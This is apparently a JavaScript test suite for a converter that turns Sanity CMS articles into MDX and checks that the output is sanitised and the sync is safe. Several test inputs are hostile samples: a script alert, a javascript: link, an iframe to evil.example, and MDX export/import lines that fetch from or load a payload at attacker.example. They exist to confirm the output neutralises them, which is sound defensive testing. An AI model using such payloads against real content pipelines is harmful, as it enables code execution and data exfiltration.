import test from 'node:test';
import assert from 'node:assert/strict';
import { articleToMdx } from './article-to-mdx.mjs';
import { validateSources } from './sanity-client.mjs';
import { planExport, validateManifest, sync } from './sync-sanity.mjs';
import { mkdtemp, mkdir, writeFile, readFile, rm } from 'node:fs/promises';
import { join } from 'node:path';
import { tmpdir } from 'node:os';

const entry = { id: 'article.en.example', path: 'guides/example', group: 'Browser Guides' };
const article = { _id: entry.id, _rev: 'rev1', _updatedAt: '2026-10-04T00:00:00Z', _type: 'article', published: true, locale: 'en', title: 'A safe title: examples', slug: {current:'example'}, description: 'A description', answerSummary: 'Use {a} < b.', body: '<h1>Duplicate title</h1><p>Read <a href="/blog/other">this guide</a>, {value} &lt;limit&gt;.</p>', faq: [{question:'Why?',answer:'Because {x} is text.'}], internalLinks: [{href:'/blog/other', label:'Other guide'}] };
test('safe deterministic mirror, canonical, headings, links, FAQ and literal MDX', async () => {
  const output = await articleToMdx(article);
  assert.equal(output, await articleToMdx(article));
  assert.match(output, /canonical: "https:\/\/tempinbox.dev\/blog\/example"/);
  assert.doesNotMatch(output, /# Duplicate title/);
  assert.match(output, /https:\/\/tempinbox.dev\/blog\/other/);
  assert.match(output, /&#123;value&#125;/);
  assert.match(output, /## Frequently asked questions/);
  assert.match(output, /source-id: article.en.example/);
});
test('tables and code survive, executable content and dangerous URLs do not', async () => {
  const output = await articleToMdx({...article, body: '<table><tr><th>A</th><th>B</th></tr><tr><td>x</td><td>y</td></tr></table><pre><code class="language-js">const x = {a: 1};\n&lt;Widget /&gt;</code></pre><script>alert(1)</script><p><a href="javascript:alert(1)">Label</a><iframe src="https://evil.example"></iframe></p>'});
  assert.match(output, /\| A\s*\| B\s*\|/);
  assert.match(output, /const x = \{a: 1\};/);
  assert.doesNotMatch(output, /alert\(1\)|iframe|javascript:/);
});
test('malformed HTML is safely parsed and triple-backticks in code remain code', async () => {
  const output = await articleToMdx({...article,body:'<p>Open <strong>bold</p><pre><code>```\n{x}</code></pre>'});
  assert.match(output, /Open/);
  assert.match(output, /````/);
});
test('missing, draft, unpublished, duplicate and wrong-locale sources fail closed', () => {
  for(const docs of [[], [{...article,_id:'drafts.'+entry.id}], [{...article,published:false}], [{...article,locale:'de'}], [article,article]]) {
    assert.throws(() => validateSources([entry], docs));
  }
  assert.deepEqual(validateSources([entry],[article]),[article]);
});
test('manifest prevents duplicate and unsafe paths and source IDs', () => {
  for(const entries of [[entry,entry],[{...entry,path:'../outside'}],[{...entry,id:'drafts.x'}],[{...entry,path:'policies/privacy'}]]) assert.throws(()=>validateManifest(entries));
  assert.deepEqual(validateManifest([entry]),[entry]);
});
test('source slug rename keeps destination; no-op and manual-edit detection', async () => {
  const files = new Map();
  const initial = await planExport([entry],[article],files,{migration:true});
  assert.equal(initial.length,1);
  files.set('guides/example.mdx',initial[0].content);
  assert.equal((await planExport([entry],[article],files)).length,0);
  const renamed = await planExport([entry],[{...article,slug:{current:'renamed'},_rev:'rev2'}],files);
  assert.equal(renamed[0].path,'guides/example.mdx');
  assert.match(renamed[0].content,/\/blog\/renamed/);
  files.set('guides/example.mdx',initial[0].content+'\nManual edit');
  await assert.rejects(planExport([entry],[article],files),/edited/);
});
test('manual existing page requires explicit first migration and source ownership matches', async () => {
  await assert.rejects(planExport([entry],[article],new Map([['guides/example.mdx','Manual content']])),/migration/);
  const output=await articleToMdx({...article,_id:'different'});
  await assert.rejects(planExport([entry],[article],new Map([['guides/example.mdx',output]])),/ownership/);
});
test('stale embedded bylines are replaced with actual source dates', async()=>{
  const output=await articleToMdx({...article,publishedAt:'2025-01-02T00:00:00Z',body:'<time class="meta">Stale date</time><p class="author-byline">Old author</p><p>Useful content</p>'});
  assert.doesNotMatch(output,/Stale date|Old author/);
  assert.match(output,/Published 2025-01-02/);
  assert.match(output,/Updated 2026-10-04/);
});
test('import and export prose cannot execute as MDX modules',async()=>{
  const output=await articleToMdx({...article,body:'<p>export const steal = globalThis.fetch("https://attacker.example/collect")</p><p>import Payload from "https://attacker.example/payload.js"</p>'});
  assert.match(output,/&#101;xport/);
  assert.match(output,/&#105;mport/);
  assert.doesNotMatch(output,/\n(?:export|import) /);
});
test('a navigation edit during validation prevents all installations',async()=>{
  const root=await mkdtemp(join(tmpdir(),'sanity-sync-race-'));
  try{
    await mkdir(join(root,'content'));
    await writeFile(join(root,'content/sanity-map.json'),JSON.stringify([entry]));
    const nav={navigation:{tabs:[{tab:'Docs',groups:[{group:'Browser Guides',pages:[]}]}]}};
    await writeFile(join(root,'docs.json'),JSON.stringify(nav));
    const manual=JSON.stringify({...nav,manualEdit:true});
    await assert.rejects(sync({root,apply:true,fetchSource:async()=>[article],validateCandidate:async()=>writeFile(join(root,'docs.json'),manual)}),/Navigation changed/);
    assert.equal(await readFile(join(root,'docs.json'),'utf8'),manual);
    await assert.rejects(readFile(join(root,'guides/example.mdx')),/ENOENT/);
  }finally{await rm(root,{recursive:true,force:true});}
});
